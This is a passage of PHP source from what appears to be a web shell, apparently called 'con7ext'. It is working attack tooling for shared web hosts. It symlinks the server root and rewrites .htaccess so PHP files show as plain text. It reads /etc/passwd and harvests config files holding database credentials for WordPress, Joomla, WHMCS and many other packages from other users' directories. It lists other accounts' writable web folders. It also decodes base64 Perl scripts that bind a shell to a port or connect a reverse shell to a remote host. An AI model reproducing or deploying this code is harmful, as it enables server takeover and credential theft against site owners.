AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "<br>
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/con7ext_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("con7ext_sym",0777);
@chdir("con7ext_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/con7ext_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("con7ext_sym",0777);@chdir("con7ext_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 =
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file =
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/con7ext_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }
} elseif($_GET['config'] == 'grabber') {
			if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
	if($_POST){	if($_POST['config'] == 'symvhosts') {
		@mkdir("con7ext_symvhosts", 0777);
exe("ln -s / con7ext_symvhosts/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("con7ext_symvhosts/.htaccess",$htaccess);
		$etc_passwd=$_POST['passwd'];
    
    $etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php con7ext_symvhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php con7ext_symvhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php con7ext_symvhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php con7ext_symvhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php con7ext_symvhosts/".$jembod."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php con7ext_symvhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml con7ext_symvhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php con7ext_symvhosts/".$jembod."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php con7ext_symvhosts/".$jembod."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("con7ext_symconfig", 0777);
@symlink("/","con7ext_symconfig/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("con7ext_symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("con7ext_sym404", 0777);
@symlink("/","con7ext_sym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*con7ext_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("con7ext_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
						mkdir("con7ext_configgrab", 0777);
						$isi_htc = "Options all\nRequire None\nSatisfy Any";
						$htc = fopen("con7ext_configgrab/.htaccess","w");
						fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_con7ext) {
$grab_config = array(
"/home/$user_con7ext/.accesshash" => "WHM-accesshash",
"/home/$user_con7ext/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_con7ext/public_html/forum/config.php" => "phpBB",
"/home/$user_con7ext/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_con7ext/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_con7ext/public_html/app/etc/local.xml" => "Magento",
"/home/$user_con7ext/public_html/admin/config.php" => "OpenCart",
"/home/$user_con7ext/public_html/application/config/database.php" => "Ellislab",
"/home/$user_con7ext/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/inc/config.php" => "MyBB",
"/home/$user_con7ext/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/inc/conf_global.php" => "IPB",
"/home/$user_con7ext/public_html/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/blog/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/submitticket.php" => "^WHMCS",
"/home/$user_con7ext/public_html/cms/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/beta/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/portal/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/site/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/main/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/home/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/demo/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/test/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/v1/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/v2/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/new/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
	if($_POST['config'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("con7ext_configgrab/$user_con7ext-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"con7ext_Symconfig/".$user_con7ext."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"con7ext_sym404/".$user_con7ext."-".$nama_config.".txt");
if($sym404){
	@mkdir("con7ext_sym404/".$user_con7ext."-".$nama_config.".txt404", 0777);
	$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
HeaderName con7ext.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";

@file_put_contents("con7ext_sym404/".$user_con7ext."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"con7ext_sym404/".$user_con7ext."-".$nama_config.".txt404/con7ext.txt");

	}

}

                    }     
		}  if($_POST['config'] == 'grab') {
            echo "<center><a href='?path=$path/con7ext_configgrab'><font color=lime>Done</font></a></center>";
		}
    if($_POST['config'] == '404') {
        echo "<center>
<a href=\"con7ext_sym404/root/\">SymlinkNya</a>
<br><a href=\"con7ext_sym404/\">Configurations</a></center>";
    }
     if($_POST['config'] == 'symlink') {
echo "<center>
<a href=\"con7ext_symconfig/root/\">Symlinknya</a>
<br><a href=\"con7ext_symconfig/\">Configurations</a></center>";
			}if($_POST['config'] == 'symvhost') {
echo "<center>
<a href=\"con7ext_symvhost/root/\">Root Server</a>
<br><a href=\"con7ext_symvhost/\">Configurations</a></center>";
			}
		
		
		}else{
        echo "<form method=\"post\" action=\"\"><center>
		</center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo include("/etc/passwd"); 
        echo "</textarea><br><br>
        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"grab\">Config Grab</option>
        <option value=\"symlink\">Symlink Config</option>
		<option value=\"404\">Config 404</option>
		<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
}
} elseif($_GET['jancok'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_con7ext_jump) {
				$user_jumping_dir = "/home/$user_con7ext_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=white>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=white>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					}
					echo $jrw;
					if(function_exists('posix_getpwuid')) {
						$domain_jump = file_get_contents("/etc/named.conf");	
						if($domain_jump == '') {
							echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
						} else {
							preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
							foreach($domains_jump[1] as $dj) {
								$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
								$user_jumping_url = $user_jumping_url['name'];
								if($user_jumping_url == $user_con7ext_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
						}
					} else {
						echo "<br>";
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
} elseif($_GET['backconnect'] == 'tool'){
echo "<br><br><center><form method=post>
<br>	<span>Bind port to /bin/sh [Perl]</span><br/>
	Port: <input type='text' name='port' value='443'> <input type=submit name=bpl value='>>'>
<br><br>
		<span>Back-connect</span><br/>
	Server: <input type='text' name='server' placeholder='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' placeholder='443'><select class='select' name='backconnect'  style='width: 100px;' height='10'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select>
   <input type=submit value='>>'>";
	if($_POST['bpl']) {
	$bp=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
	$brt=@fopen('bp.pl','w');
fwrite($brt,$bp);
$out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bp.pl")."</pre>";
unlink("bp.pl");
		}
		if($_POST['backconnect'] == 'perl') {
$bc=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
$plbc=@fopen('bc.pl','w');
fwrite($plbc,$bc);
$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
unlink("bc.pl");
}
if($_POST['backconnect'] == 'python') {
